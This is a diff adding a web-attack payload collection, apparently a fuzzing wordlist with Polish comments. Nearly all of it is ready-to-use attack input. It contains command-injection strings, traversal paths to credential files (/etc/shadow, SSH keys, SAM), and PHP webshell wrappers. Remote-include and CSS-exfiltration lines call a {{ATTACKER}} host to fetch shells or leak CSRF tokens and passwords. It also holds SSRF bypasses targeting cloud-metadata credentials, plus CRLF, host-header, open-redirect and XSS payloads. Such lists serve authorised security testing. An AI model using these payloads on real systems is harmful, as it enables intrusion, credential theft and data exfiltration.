+this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")
+
+# === Java OGNL / EL injection ===
+${@java.lang.Runtime@getRuntime().exec("id")}
+%{(#cmd='id').(#p=new java.lang.ProcessBuilder({'sh','-c',#cmd}))}
+
+# === Server-side JavaScript (eval reflected) ===
+;process.exit()
+);process.mainModule.require('child_process').execSync('id');//
+
+# ============ TRAVERSAL/LFI ============
+# === Linux — wysokowartościowe pliki ===
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/resolv.conf
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/version
+/proc/cpuinfo
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.ssh/id_rsa
+/var/www/html/.env
+/var/www/html/wp-config.php
+
+# === Windows — wysokowartościowe pliki ===
+C:\Windows\win.ini
+C:\Windows\system32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\repair\SAM
+C:\Windows\debug\NetSetup.LOG
+C:\inetpub\wwwroot\web.config
+C:\boot.ini
+C:\xampp\apache\conf\httpd.conf
+
+# === Path traversal — Linux ===
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+
+# === Null byte (legacy PHP < 5.3.4) ===
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# === Absolute path bypass ===
+/etc/passwd
+file:///etc/passwd
+
+# === PHP wrappers — file read ===
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+phar://test.phar/file
+zip://test.zip#file
+
+# ============ TRAVERSAL/RFI ============
+# === Remote include — wymaga {{ATTACKER}} ===
+http://{{ATTACKER}}/shell.txt
+http://{{ATTACKER}}/shell.txt?
+http://{{ATTACKER}}/shell.txt%00
+//{{ATTACKER}}/shell.txt
+\\{{ATTACKER}}\shell.txt
+
+# === PHP wrappers — RCE ===
+data://text/plain,<?php system($_GET[0]);?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
+expect://id
+php://input
+
+# === SMB share (Windows IIS PHP) ===
+\\{{ATTACKER}}\share\shell.php
+//{{ATTACKER}}/share/shell.php
+
+# ============ TRAVERSAL/PATH-TRAVERSAL ============
+# === Basic ../ ===
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+
+# === Encoded ===
+..%2f
+%2e%2e%2f
+..%252f
+%2e%2e/
+..\
+..%5c
+%2e%2e%5c
+
+# === Double encoding ===
+%252e%252e%252f
+%252e%252e/
+..%c0%af
+..%c1%9c
+
+# === Filter bypass — non-recursive replace ===
+....//
+....\\\\
+....\/
+..../\
+..;/
+..//
+
+# === Whitelist bypass — extension append ===
+../../../etc/passwd%00.png
+../../../etc/passwd#.png
+../../../etc/passwd?.png
+
+# === UTF-8 overlong ===
+%c0%2e%c0%2e/
+%e0%80%ae%e0%80%ae/
+
+# ============ SSRF/SSRF-BASIC ============
+# === Localhost variants ===
+http://localhost/
+http://localhost:80/
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://0.0.0.0/
+http://[::1]/
+http://[::]/
+
+# === Loopback alternative encodings ===
+# Decimal
+http://2130706433/
+# Octal
+http://0177.0.0.1/
+# Hex
+http://0x7f.0x0.0x0.0x1/
+http://0x7f000001/
+# Mixed
+http://127.1/
+http://127.0.1/
+
+# === IPv6 ===
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+
+# === Internal services typowe ===
+http://localhost:22/
+http://localhost:6379/
+http://localhost:3306/
+http://localhost:5432/
+http://localhost:9200/
+http://localhost:8080/
+http://localhost:8500/
+http://localhost:2375/
+
+# === File scheme ===
+file:///etc/passwd
+file://localhost/etc/passwd
+
+# === Gopher (Redis/SMTP exploitation) ===
+gopher://localhost:6379/_FLUSHALL
+gopher://localhost:25/_HELO%20x
+
+# === Dict (info disclosure) ===
+dict://localhost:11211/stats
+
+# ============ SSRF/SSRF-BYPASS ============
+# === DNS-based bypass — domena wskazująca na 127.0.0.1 ===
+http://localtest.me/
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://spoofed.burpcollaborator.net/
+
+# === Userinfo/host confusion (URL parser desync) ===
+http://expected.com@127.0.0.1/
+http://127.0.0.1#expected.com/
+http://127.0.0.1?expected.com/
+http://expected.com\@127.0.0.1/
+http://127.0.0.1.expected.com/
+http://expected.com.127.0.0.1.nip.io/
+
+# === Protocol confusion / smuggling ===
+http://foo@evil.com:80@127.0.0.1/
+http://evil.com\\@127.0.0.1/
+
+# === Redirect-based (302 follow) ===
+# Wymagana podmiana {{ATTACKER}} — endpoint atakującego zwraca 302 do internal
+http://{{ATTACKER}}/redirect?url=http://169.254.169.254/
+
+# === Punycode / IDN ===
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
+http://locаlhost/
+
+# === Double URL encoding ===
+http://%6c%6f%63%61%6c%68%6f%73%74/
+http://%2569%2570%2531/
+
+# === Wrapped schemes ===
+ldap://127.0.0.1/
+sftp://127.0.0.1/
+tftp://127.0.0.1/
+
+# === DNS rebinding ready ===
+http://7f000001.rebind.network/
+http://make-127-0-0-1-rr-{{ATTACKER}}.repeat.rebind.it/
+
+# ============ SSRF/SSRF-CLOUD-METADATA ============
+# === AWS — IMDSv1 ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# === AWS — IMDSv2 (wymaga PUT token, ale niektóre proxy fail-open) ===
+# Header: X-aws-ec2-metadata-token: <token>
+http://169.254.169.254/latest/api/token
+
+# === AWS ECS task metadata ===
+http://169.254.170.2/v2/credentials/
+
+# === GCP ===
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/computeMetadata/v1/
+# Wymaga header: Metadata-Flavor: Google
+
+# === Azure ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Wymaga header: Metadata: true
+
+# === DigitalOcean ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1.json
+
+# === Alibaba Cloud ===
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# === Oracle Cloud ===
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/identity/
+
+# === Kubernetes API (gdy SSRF z poda) ===
+https://kubernetes.default.svc/api/v1/namespaces/default/pods/
+https://kubernetes.default.svc/api/v1/secrets
+
+# === Docker socket ===
+http://localhost/v1.40/containers/json
+http://127.0.0.1:2375/containers/json
+
+# ============ HTTP/CRLF-INJECTION ============
+# === Basic CRLF ===
+%0d%0a
+%0a
+%0d
+%23%0d%0a
+%3f%0d%0a
+
+# === Header injection ===
+%0d%0aSet-Cookie:%20injected=1
+%0d%0aLocation:%20https://evil.com
+%0d%0aContent-Length:%200%0d%0a%0d%0a
+%0d%0aX-Injected:%20test
+
+# === Response splitting (full HTTP body) ===
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2032%0d%0a%0d%0a<script>alert(1)</script>
+
+# === Cache poisoning trigger ===
+%0d%0aX-Forwarded-Host:%20evil.com
+%0d%0aHost:%20evil.com
+
+# === Double encoding ===
+%250d%250a
+%25250d%25250a
+%u000d%u000a
+
+# === Unicode / overlong UTF-8 ===
+%e5%98%8a%e5%98%8d
+%c4%8d%c4%8a
+
+# === XSS via CRLF (gdy reflected w response header) ===
+%0d%0a%0d%0a<svg onload=alert(1)>
+
+# ============ HTTP/HOST-HEADER ============
+# === Host header override ===
+# Bezpośrednia wartość Host: header — przy wysyłaniu zmień, nie URL
+evil.com
+{{ATTACKER}}
+localhost
+
+# === Indirect override headers (proxy chain) ===
+X-Forwarded-Host: evil.com
+X-Forwarded-Server: evil.com
+X-Host: evil.com
+X-HTTP-Host-Override: evil.com
+Forwarded: host=evil.com
+X-Original-Host: evil.com
+
+# === Dual host header (parser desync) ===
+# Drugi Host w żądaniu — niektóre frameworki preferują ostatni
+Host: target.com\r\nHost: evil.com
+
+# === Port confusion ===
+evil.com:80
+target.com:443@evil.com
+target.com#@evil.com
+
+# === Cache poisoning probes ===
+target.com.evil.com
+target.com,evil.com
+
+# ============ HTTP/HTTP-VERB-TAMPERING ============
+# === Standard methods (do testowania ACL) ===
+GET
+POST
+PUT
+DELETE
+PATCH
+OPTIONS
+HEAD
+
+# === WebDAV / rzadkie ===
+PROPFIND
+TRACE
+TRACK
+CONNECT
+DEBUG
+
+# === Method override headers (w nagłówkach, gdy WAF blokuje DELETE/PUT) ===
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+
+# ============ HTTP/PARAMETER-POLLUTION ============
+# === Same parameter, multiple values ===
+# Test, który wariant backend bierze: pierwszy / ostatni / concatenated
+?id=1&id=2
+?id=1&id=2&id=3
+?id[]=1&id[]=2
+
+# === Pollution — bypass blacklist ===
+# Pierwszy 'id' przepuszczony przez WAF, drugi exploituje
+?user=admin&user=guest
+?role=user&role=admin
+
+# === Mixed body / query ===
+# Body: id=1, query: ?id=2 — niektóre frameworki priorytetyzują
+?param=safe (POST: param=<payload>)
+
+# === Array notation differences ===
+?id[0]=1&id[1]=2
+?id.0=1&id.1=2
+
+# === Comma-separated (Spring etc.) ===
+?id=1,2,3
+
+# === Encoded separator ===
+?id=1%26id=2
+?id=1%3Bid=2
+
+# === Per-framework specific ===
+# PHP: bierze ostatni; ASP: konkatenuje przecinkiem; Node Express: array
+?cmd=ls&cmd=id
+
+# ============ CLIENT-SIDE/OPEN-REDIRECT ============
+# === Bezpośrednie URL-e ===
+https://evil.com
+https://evil.com/
+//evil.com
+//evil.com/
+\\evil.com
+\/\/evil.com
+//evil.com/%2e%2e
+
+# === Z domeną docelową w userinfo (mylenie parsera) ===
+https://target.com@evil.com
+https://target.com.evil.com
+https://evil.com#target.com
+https://evil.com?target.com
+https://evil.com\@target.com
+
+# === Backslash bypass (Chrome/Firefox parsują różnie) ===
+/\evil.com
+/\\evil.com
+/\/evil.com
+
+# === Whitespace / control chars ===
+%09//evil.com
+%0d%0a//evil.com
+%00//evil.com
+ //evil.com
+
+# === Protocol smuggling ===
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+
+# === IP fallback ===
+//127.0.0.1
+//2130706433
+//0x7f000001
+
+# === Unicode confusion ===
+//evil。com
+//ⓔⓥⓘⓛ.com
+
+# ============ CLIENT-SIDE/CSS-INJECTION ============
+# === @import (steal data via load order) ===
+</style><style>@import url("https://{{ATTACKER}}/x.css");</style>
+@import"//{{ATTACKER}}/x.css";
+
+# === Attribute selector — exfil character-by-character ===
+input[name="csrf"][value^="a"]{background:url(//{{ATTACKER}}/?a)}
+input[name="csrf"][value^="b"]{background:url(//{{ATTACKER}}/?b)}
+
+# === Font-face exfiltration ===
+@font-face{font-family:x;src:url(//{{ATTACKER}}/?leak)}body{font-family:x}
+
+# === Style breakout ===
+</style><script>alert(1)</script>
+*/}</style><svg onload=alert(1)>
+
+# === HTML injection wewnątrz <style> ===
+expression(alert(1))
+
+# === Keylogger via attribute selector na input ===
+input[type=password][value$="a"]~*{background:url(//{{ATTACKER}}/?a)}
+
+# ============ CLIENT-SIDE/POSTMESSAGE ============
+# === Wysyłka postMessage z atakującego (uruchamiane w window.opener / iframe) ===
+# Wykonywane w konsoli atakującego — payloady do wysłania
+target.postMessage('<img src=x onerror=alert(1)>','*')
+target.postMessage({type:'auth',token:'attacker'},'*')
+target.postMessage(JSON.stringify({cmd:'eval',data:'alert(1)'}),'*')
+
+# === Stringi do detekcji listenera bez weryfikacji origin ===
+__proto__
+constructor
+{"type":"__proto__","value":1}
+
+# === Reflected payload — gdy aplikacja renderuje event.data ===
+<svg onload=alert(1)>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
+
+# ============ CLIENT-SIDE/CORS-ORIGINS ============
+# === Origin header values do testowania ACAO regex ===
+https://target.com.evil.com
+https://eviltarget.com
+https://target.com.attacker.net
+https://target-com.evil.com
+null
+https://target.com:1337
+https://attacker.target.com
+https://target.com\.evil.com
+file://
+
+# ============ CLIENT-SIDE/WEBSOCKET ============
+# === Origin headers (Cross-Site WebSocket Hijacking) ===
+Origin: https://evil.com
+Origin: null
+Origin: https://target.com.evil.com
+
+# === Message payloads (XSS via WS message rendered to DOM) ===
+<img src=x onerror=alert(1)>
+{"cmd":"exec","data":"alert(1)"}
+
+# ============ MISC/FORMAT-STRING ============
+# === Read-leaks ze stosu ===
+%x
+%x.%x.%x.%x
+%s
+%s.%s.%s.%s
+%p
+%p.%p.%p.%p
+AAAA.%p.%p.%p.%p
+
+# === Write-primitives (%n) ===
+%n
+AAAA%n
+%hn
+%hhn
+
+# === Direct param access ===
+%1$x
+%2$x
+%3$x.%4$x.%5$x
+
+# === Wide ===
+%S
+%lx
+
+# === Probe combo ===
+%x%x%x%x%x%x%x%x%x%x
+
+# ============ MISC/CANARIES ============
+# === Unikalne markery do wykrywania reflected input ===
+# Każdy marker zawiera characters do wykrycia kontekstu (quote, bracket, etc.)
+zZ1xCanaryAlpha
+zZ2xCanary'"<>
+zZ3xCanary{{7*7}}
+zZ4xCanary${7*7}
+zZ5xCanary[[7*7]]
+zZ6xCanary<%=7*7%>
+zZ7xCanary'OR'1'='1
+zZ8xCanary<svg/onload=alert(1)>
+zZ9xCanary../../../etc/passwd
+zZAxCanary%0d%0aX-Injected:1
